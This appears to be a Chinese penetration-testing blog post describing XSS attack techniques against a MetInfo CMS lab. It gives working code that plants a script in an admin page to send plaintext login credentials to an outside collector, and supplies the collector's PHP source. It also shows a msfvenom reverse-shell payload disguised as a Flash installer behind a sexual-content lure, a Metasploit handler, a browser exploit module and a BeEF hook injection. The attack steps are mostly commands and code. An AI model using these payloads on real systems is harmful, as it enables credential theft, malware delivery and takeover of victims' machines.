![1645923603748-30bd8487-d0ca-4742-854d-0d4e67070d35.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172422304-1180766360.png)

```plain
#知识点： 1、XSS跨站-另类攻击手法分类 2、XSS跨站-权限维持&钓鱼&浏览器等 1、原理 指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。 -数据交互的地方 get、post、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义 -数据输出的地方 用户资料 关键词、标签、说明 文件上传 2、分类 反射型（非持久型） 存储型（持久型） DOM型 mXSS(突变型XSS)  UXSS（通用型xss） Flash XSS UTF-7 XSS MHTML XSS CSS XSS  VBScript XSS 3、危害 网络钓鱼，包括获取各类用户账号； 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等； 强制弹出广告页面、刷流量等； 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如ddos等； 获取客户端信息，如用户的浏览历史、真实ip、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf,实施进一步危害； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等 4、修复 见绕过课程对比参考 #XSS跨站系列内容： 1、XSS跨站-原理&分类&手法 2、XSS跨站-探针&利用&审计 3、XSS跨站-另类攻击手法利用 4、XSS跨站-防御修复&绕过策略
```

- XSS-后台植入Cookie&表单劫持

------

```plain
-条件：已取得相关web权限后 获取cookie的时候有时候会获取不全（phpsessid验证） 表单劫持可以得到一些权限维持，密文密码解密不了。可以通过他来获取明文账号密码。
已经取得了权限，要对后台的权限进行长期控制，可以借助xss盗取cookie，把他写入代码到登录成功文件，利用beef或xss平台实时监控Cookie等凭据实现权限维持 这种方法即使他把后台账号密码改了，也可以进行权限维持。（不会被后门工具识别。） 比如：登录的框页面http://127.0.0.1:8105/admin/login/login.php 登录成功后会跳转到http://127.0.0.1:8105/admin/index.php?lang=cn 我们就可以在登录成功的admin/index.php上进行操作，写入<sCRiPt sRC=//xss.pt/X8Vz></sCrIpT> 进行登录，然后就可以触发到相对应的代码。
```

![1645930438846-51b01966-10c6-48fe-a3b8-3b95087c9755.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504480-1816928231.png)

```plain
可以观察到，他加载的数据包的内容
```

![1645930528211-65b05c55-4c00-4f7c-8690-355d6b4ee154.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505889-1871563938.png)

```plain
这样，只要登录成功就能获取，就能进行实时控制。进行了权限维持。 但是有一些网站不采用cookie，即使获取到了，但是还是不能登录。 正常来讲，访问这个地址：http://127.0.0.1:8105/admin/index.php?lang=cn 进行抓包修改cookie： UM_distinctid=17f38be65b3495-049fe07b7f19bd-e726559-1fa400-17f38be65b4b7d; CNZZDATA1670348=cnzz_eid%3D674406514-1645919148-%26ntime%3D1645919148; coul=8; lastvisit=0%091645924524%09%2F; _ac_app_ua=a0540fb14f9cd9d34f; recordurl=%2Chttp%253A%252F%252F127.0.0.1%253A8105%252F%2Chttp%253A%252F%252F127.0.0.1%253A8105%252Fabout%252Fshow.php%253Flang%253Dcn%2526id%253D19%2Chttp%253A%252F%252F127.0.0.1%253A8105%252Fnews%252F%2Chttp%253A%252F%252F127.0.0.1%253A8105%252Fjob%252F%2Chttp%253A%252F%252F127.0.0.1%253A8105%252F%2Chttp%253A%252F%252F127.0.0.1%253A8105%252F%2Chttp%253A%252F%252F127.0.0.1%253A8105%252F%2Chttp%253A%252F%252F127.0.0.1%253A8105%252F; PHPSESSID=e8gt6fhf1ba01jln0m6t0ljni1
```

![1645930888084-0913c117-274e-4a12-b9f0-cef3078f4090.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505218-616665476.png)

```plain
但是返回包里明显还是登录不成功。 正确的cookie信息：UM_distinctid=17e46c24838315-027dd22377488f8-1262694a-144000-17e46c24839418; CNZZDATA3801251=cnzz_eid%3D1994470479-1641863151-%26ntime%3D1645228788; CNZZDATA1670348=cnzz_eid%3D1668791702-1645652947-%26ntime%3D1645652947; PHPSESSID=smd97a9vae15lsg0tf2claaoi3 可以得知他获取的cookie是不全的，或者说错误的。一般来说少了phpsessid (有防护)
那么就来进行实时的获取明文账号密码，这样才能进行权限维持。需要一定的基础量，能读懂数据的传输流程。 那么现在观察一下这个网站的登录流程是怎样的。 登录地址http://127.0.0.1:8105/admin/login/login.php 找到想对应的代码段D:\phpstudy_pro\WWW\xss-MetInfo5.1.4\admin\login\login.php 抓取登录的数据包
```

![1645931769293-0668f567-0b99-4edc-9c95-e60cbea30cc5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172503193-259714763.png)

```plain
可以看到，他提交的数据包是给了login_check.php文件，也就是说，他的账号密码是发送给了login_check.php这个文件。 查看提交的数据
```

![1645932659164-9f516362-c71f-490a-97ce-8135adcc8153.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504016-1501658563.png)

```plain
action=login&loginlang=login.php%3Flangset%3Dcn&login_name=admin&login_pass=admin&Submit=%E7%99%BB%E5%BD%95 再次观察login_check.php
```

![1645932798875-2d6dc940-faee-46e0-9ff3-acedf40c94f6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505591-1439970201.png)

```plain
可以知道两个接受账号密码的变量： 接受账号：$metinfo_admin_name 接受密码：$metinfo_admin_pass 然后用到JavaScript语句来进行账号密码的发送，那么应该怎么构造JavaScript语句呢？ 将账号发送到某个地方 语句构造：<script src="http://www.xiaodi8.com/get.php?user="账号"&pass"密码""></script> 在某个地方来实现接收。get.php实现接收 构造payload： $up='<script src=http://127.0.0.1:8081/web/get.php?user='.$metinfo_admin_name.'&pass='.$metinfo_admin_pass.'></script>'; echo $up;
```

![1645940619160-44aa7521-d167-4920-a1b5-7edea5d87d37.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172503946-541632934.png)

```plain
在http://127.0.0.1:8081/web中穿件get.php代码。 get.php代码： <?php $u=$_GET['user']; $p=$_GET['pass']; $myfile=fopen("newfile.txt","a+"); fwrite($myfile,$u); fwrite($myfile,'|'); fwrite($myfile,$p); fwrite($myfile,'\n'); fclose($myfile); ?> 接收账号密码，写到newfile文件中
然后尝试登录这个网站中，可以看到他尝试请求http://127.0.0.1:8081/web/get.php这个网站，把admin和password发送出去
```

![1645944665210-e5c7ddc4-a7e6-4722-804d-ca08722cb02e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504368-372422206.png)

```plain
在登录下输入的账号密码，就会发送到newfile中记录，这个时候就可以进行测试了。 主要解决两个问题： 1.cookie失败的时候（截取不到）。 2.取得一些权限，密码解密不了。
```

- XSS-Flash钓鱼配合MSF捆绑上线

------

```plain
-条件：beef上线受控后或直接钓鱼（受害者爱看SESE） 1、生成后门，攻击是pc端的。 msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.100.167.248 LPORT=1111 -f exe > flash.exe
```

![1645947250053-258f9072-70ec-4ee5-990f-f41edacaff97.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504162-1986235907.png)

```plain
flash下载官方地址：https://www.flash.cn/ 我们构造的flash下载地址：http://127.0.0.1:8106/   （一般是构造一个比较逼真的网址。） 把后门放在D:\phpstudy_pro\WWW\web\目录上 打开构造好的地址，index.html文件，把立即下载这个地址改为后门下载地址：http://127.0.0.1:8081/web/flash.exe
```

![1645947931558-808fbfbb-1445-4033-b801-9828a497c964.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504480-1486812632.png)

```plain
运行exe并且安装正常的文件，所以需要捆绑正常文件。 在官方网站下载一个正常的flash文件 正常文件：flashcenter_pp_ax_install_cn.exe 后门文件：flash.exe 把两个文件放在一起，压缩
```

![1645948388138-97a2c1ff-9f79-424e-b471-944f2465c1c2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504200-1849298980.png)

```plain
选择高级，自解压选项，解压到c:\windows\temp
```

![1645948483601-4e06f577-4ebc-47f4-9991-04a6da87ab5b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504791-1322580570.png)

```plain
点击设置：
```

![1645948640597-c2a026fa-ce97-4e70-aa68-f0198b0322c7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504402-1560542301.png)

```plain
在确定，压缩为rar文件。然后再把文件名一改，改成flash_install.exe文件，把图片在进行修改。 图标修改用到Restorator2018_Full_1793_FIX工具。 把两个exe文件拖进去，然后把官方的图片导出。
```

![1645949000852-8c465f4c-09f4-43cc-be7a-20c9122ec1c3.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505807-1026465527.png)

```plain
然后再把他导入我们创建的exe中，但是我这里发生了错误。
```

![1645949390125-b7055bce-068b-4ecf-8e5d-85213f094893.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172506129-913532207.png)

```plain
启动msf监听： msfconsole use exploit/multi/handler  set payload windows/meterpreter/reverse_tcp set lhost 0.0.0.0 set lport 1111 run
```

![1645949796543-4278c321-9e0d-49df-bafe-fe7bd79dfa26.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504659-1609821053.png)

```plain
那个别人是怎么访问你这个地址呢？ 1.通过xss beef来让浏览器自动访问下载后门，并且运行 2.直接发给对方诱使他去访问。 通过发送消息，比如小迪与某主播瑟瑟画面流出：http://127.0.0.1:8081/web/诱惑.html 当访问想看的时候
```

![1645950387936-984f7564-06b6-4f8a-9fcd-588df92c064f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505885-1283347611.png)

```plain
访问，直接跳转，然后配合后门上线
```

![1645974874880-401e9a76-547e-4dd2-b6e2-ae79f9e64dd8.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505553-262805369.png)

```plain
执行后门，上线完成
```

![1645975051732-5fa348af-156b-4024-a96c-4944c5eb81d8.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505881-445832978.png)

```plain
这一类遇到的问题：免杀问题（后门下载下来会遭到火绒等查杀）
```

- XSS-浏览器网马配合MSF访问上线

------

```plain
-条件：beef上线受控后或直接钓鱼（浏览器存在0day） 配合漏洞CVE-2019-1367，这个版本是IE11的漏洞，但是没有公开exp。 参考文章：https://www.cnblogs.com/yuzly/p/11609934.html 漏洞CVE-2020-1380：https://bbs.pediy.com/thread-263885.htm 但是前面的漏洞并没有公开，所以只能用到ms14_064这个漏洞，参考https://blog.csdn.net/wylululu/article/details/103868759 用的是Windows7这个版本的IE，在当前的网络环境中就很少他了。 1、配置MSF生成URL use exploit/windows/browser/ms14_064_ole_code_execution set allowpowershellprompt true set target 1 run
```

![1646028417415-aeab27a8-1859-40e9-acd7-2ca27853058a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172504924-946401172.png)

```plain
运行就会生成一个网码地址（http://47.100.167.248:8080/9gwKDtliqQz ），这个地址只要一访问就会被触发。但是这个地址只针对window7操作系统
```

![1646029054102-f2a17b51-3cab-40c5-b743-d37399b44464.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172506049-1416966394.png)

```plain
但是这个不成功，所以需要换一个kali搭建的msf
```

![1646029504625-62dfdad0-9f6c-4568-915e-ea1cc7f69166.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505653-1084962839.png)

```plain
这个只要访问就可以拿下服务器权限。还需要用满足的浏览器和Windows版本。 内核，操作系统，还有杀毒软件，都会导致失败。要懂得前提条件，不是只要访问就可以上线。 那么他在xss中如何实现呢？ 启动beef：docker run --rm -p 3000:3000 janes/beef 登录beef：47.100.167.248:3000/ui/panel 构造代码：<script src=http://47.100.167.248:3000/hook.js></script> 把代码放在博客上（或者本地上）放在web/test.html上 只要在虚拟机中访问192.168.199.1:8081/web/test.html
```

![1646031279089-c877f92b-e9cc-4e75-92d3-192611375662.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505858-679353123.png)

```plain
上线到beef上，利用浏览器跳转功能
```

![1646031545946-985a8596-b895-4dd0-a855-cc36225a2488.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912172505850-545346840.png)

```plain
然后就可以上线，完成测试。
```